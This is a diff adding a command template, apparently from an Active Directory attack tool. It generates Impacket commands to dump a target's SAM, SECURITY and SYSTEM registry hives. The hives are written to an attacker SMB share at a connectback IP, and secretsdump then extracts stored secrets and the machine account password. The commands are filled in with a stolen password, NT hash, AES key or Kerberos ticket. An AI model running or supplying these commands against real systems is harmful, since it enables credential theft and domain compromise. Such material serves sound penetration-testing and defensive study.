@@ -1,0 +1,21 @@
+# Find an accessible share or create yours:
+sudo smbserver.py -smb2support MYSHARE .
+
+# TODO: check before if there is a GPO which restricts the SeBackup privilege
+
+# Backup SAM, SECURITY and SYSTEM
+# Warning: if you put '-o .', it will write files into {{target_no_dollar}}/C$/Windows/System32!
+# Access to registry hives can be monitored and alerted via event ID 4656 (A handle
+# to an object was requested).
+{% if parent.krb_auth %}
+reg.py '{{fqdn}}/{{parent.obj.name}}@{{target_no_dollar}}' -dc-ip {{dc_ip}} -target-ip {{target_ip|red}} -k -no-pass backup -o '\\{{connectback_ip|red}}\MYSHARE'"
+{%- elif parent.secret_type == T_SECRET_NTHASH %}
+reg.py '{{fqdn}}/{{parent.obj.name}}@{{target_no_dollar}}' -dc-ip {{dc_ip}} -target-ip {{target_ip|red}} -hashes :{{parent.secret|red}} backup -o '\\{{connectback_ip|red}}\MYSHARE'"
+{%- elif parent.secret_type == T_SECRET_AESKEY %}
+reg.py '{{fqdn}}/{{parent.obj.name}}@{{target_no_dollar}}' -dc-ip {{dc_ip}} -target-ip {{target_ip|red}} -k -aesKey {{parent.secret|red}} backup -o '\\{{connectback_ip|red}}\MYSHARE'"
+{%- elif parent.secret_type == T_SECRET_PASSWORD %}
+reg.py '{{fqdn}}/{{parent.obj.name}}:{{parent.secret|red}}@{{target_no_dollar}}' -dc-ip {{dc_ip}} -target-ip {{target_ip|red}} backup -o '\\{{connectback_ip|red}}\MYSHARE'"
+{% endif %}
+
+# Extract secrets (take the $MACHINE.ACC:plain_password_hex)
+secretsdump.py -sam SAM.save -security SECURITY.save -system SYSTEM.save local
